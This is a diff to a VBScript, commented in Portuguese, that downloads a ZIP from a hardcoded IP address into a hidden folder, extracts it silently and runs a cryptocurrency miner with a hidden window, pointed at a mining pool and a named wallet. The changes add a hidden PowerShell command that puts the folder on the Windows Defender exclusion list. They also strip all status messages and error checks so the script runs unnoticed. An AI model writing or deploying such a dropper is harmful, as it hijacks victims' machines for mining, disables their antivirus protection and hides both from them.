@@ -12,15 +12,20 @@ If Not fso.FolderExists(hiddenFolder) Then
     fso.CreateFolder(hiddenFolder)
 End If
 
+' --- TENTATIVA DE EXCLUSÃO NO DEFENDER ---
+' Executa PowerShell silenciosamente para adicionar a pasta como exclusão
+cmdExclusion = "powershell -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath '" & hiddenFolder & "'"""
+shell.Run cmdExclusion, 0, True
+' -----------------------------------------
+
 ' Caminhos dos arquivos
 zipPath = hiddenFolder & "\miner.zip"
-' Assumindo que o exe dentro do zip se chama sbrminer.exe. Ajuste se for diferente.
 minerExeName = "sbrminer.exe"
 minerPath = hiddenFolder & "\" & minerExeName
 
 ' Verifica se o minerador já foi extraído
 If Not fso.FileExists(minerPath) Then
-    url = "http://15.228.181.140:8585/miner.zip" ' Altere para o link do ZIP
+    url = "http://15.228.181.140:8585/miner.zip" 
     
     ' Configura requisição
     http.Open "GET", url, False
@@ -30,45 +35,29 @@ If Not fso.FileExists(minerPath) Then
     ' Salva o ZIP
     If http.Status = 200 Then
         Set stream = CreateObject("ADODB.Stream")
-        stream.Type = 1 ' adTypeBinary
+        stream.Type = 1
         stream.Open
         stream.Write http.ResponseBody
-        stream.SaveToFile zipPath, 2 ' adSaveCreateOverWrite
+        stream.SaveToFile zipPath, 2
         stream.Close
         Set stream = Nothing
         
-        WScript.Echo "[INFO] ZIP baixado. Extraindo..."
-        
-        ' Extração automática usando Shell.Application
+        ' Extração automática silenciosa
         Set sourceZip = zipShell.NameSpace(zipPath)
         Set destFolder = zipShell.NameSpace(hiddenFolder)
         
-        ' Copia todos os itens do zip para a pasta de destino
-        ' 4&16 = NoConfirmation + OverwriteFiles
-        destFolder.CopyHere sourceZip.Items, 4+16
+        ' 4 = NoConfirmation, 16 = OverwriteFiles, 256 = NoProgressUI
+        destFolder.CopyHere sourceZip.Items, 4 + 16 + 256
         
-        ' Aguarda a extração terminar (loop simples)
+        ' Aguarda a extração terminar
         Do While destFolder.Items.Count < sourceZip.Items.Count
             WScript.Sleep 1000
         Loop
-        
-        WScript.Echo "[INFO] Extração concluída."
-    Else
-        WScript.Echo "ERRO HTTP: Status " & http.Status & " ao baixar o ZIP."
-        WScript.Quit 1
     End If
-Else
-    WScript.Echo "[INFO] Minerador já existe."
 End If
 
-' Verificação final do executável
-If Not fso.FileExists(minerPath) Then
-    WScript.Echo "ERRO: O executavel '" & minerExeName & "' nao foi encontrado apos a extração. Verifique o nome do arquivo dentro do ZIP."
-    WScript.Quit 1
-End If
-
-' Aguarda 5 segundos para teste
+' Aguarda 5 segundos para garantir estabilidade
 WScript.Sleep 5000
 
-' Executa o minerador (1 = Visível)
+' Executa o minerador (1 = Visível, 0 = Oculto)
 shell.Run """" & minerPath & """ --algorithm yespowerr16 --pool stratum+tcp://pool.rhinominer.rocks:3333 --wallet RMuSGreUdbeN5ma6MSjVXdUsvirLL2zRck.caioalzap --password x --diff-factor 0.1", 0, False
